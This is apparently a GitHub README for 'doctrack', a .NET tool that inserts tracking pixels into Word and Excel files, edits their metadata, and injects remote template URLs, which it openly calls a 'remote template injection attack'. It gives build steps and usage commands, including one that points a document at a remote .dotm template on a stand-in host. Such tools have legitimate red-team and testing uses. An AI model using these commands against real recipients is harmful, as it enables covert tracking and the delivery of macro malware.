# Doctrack
Tool to manipulate and insert tracking pixels into Office Open XML documents.
## Features
* Insert tracking pixels into Office Open XML documents (Word and Excel)
* Inject template URL for remote template injection attack
* Inspect external target URLs and metadata
* Create Office Open XML documents (#TODO)
## Installation
You will need to download [.Net Core SDK](https://dotnet.microsoft.com/download/) for your platform. Then, to build single binary on Windows:
```cmd
$ git clone https://github.com/wavvs/doctrack.git
$ cd doctrack/
$ dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
```
On Linux:
```bash
$ dotnet publish -r linux-x64 -c Release /p:PublishSingleFile=true
```
## Usage
```cmd
$ doctrack --help
Tool to manipulate and insert tracking pixels into Office Open XML documents.
Copyright (C) 2020 doctrack

  -i, --input         Input filename.
  -o, --output        Output filename.
  -m, --metadata      Metadata to supply (json file)
  -u, --url           URL to insert.
  -e, --template      (Default: false) If set, enables template URL injection.
  -t, --type          Document type. If --input is not specified, creates new
                      document and saves as --output.
  -l, --list-types    (Default: false) Lists available types for document
                      creation.
  -s, --inspect       (Default: false) Inspect external targets.
  --help              Display this help screen.
```
Available document types listed below. If you want to insert tracking URL just use either Document or Workbook types, 
other types listed here are only for document creation (#TODO).
```cmd
$ doctrack --list-types
Document              (*.docx)
MacroEnabledDocument  (*.docm)
MacroEnabledTemplate  (*.dotm)
Template              (*.dotx)
Workbook              (*.xlsx)
MacroEnabledWorkbook  (*.xlsm)
MacroEnabledTemplateX (*.xltm)
TemplateX             (*.xltx)
```
Insert tracking pixel and change document metadata:
```cmd
$ doctrack -t Document -i test.docx -o test.docx --metadata metadata.json --url http://test.url/image.png
```
Insert remote template URL (remote template injection attack), works only with Word documents:
```cmd
$ doctrack -t Document -i test.docx -o test.docx --url http://test.url/template.dotm --template
```
Inspect external target URLs and metadata:
```cmd
$ doctrack -t Document -i test.docx --inspect
[External targets]
Part: /word/document.xml, ID: R8783bc77406d476d, URI: http://test.url/image.png
Part: /word/settings.xml, ID: R33c36bdf400b44f6, URI: http://test.url/template.dotm
[Metadata]
Creator:
Title:
Subject:
Category:
Keywords:
Description:
ContentType:
ContentStatus:
Version:
Revision:
Created: 13.10.2020 23:20:39
Modified: 13.10.2020 23:20:39
LastModifiedBy:
LastPrinted: 13.10.2020 23:20:39
Language:
Identifier:
```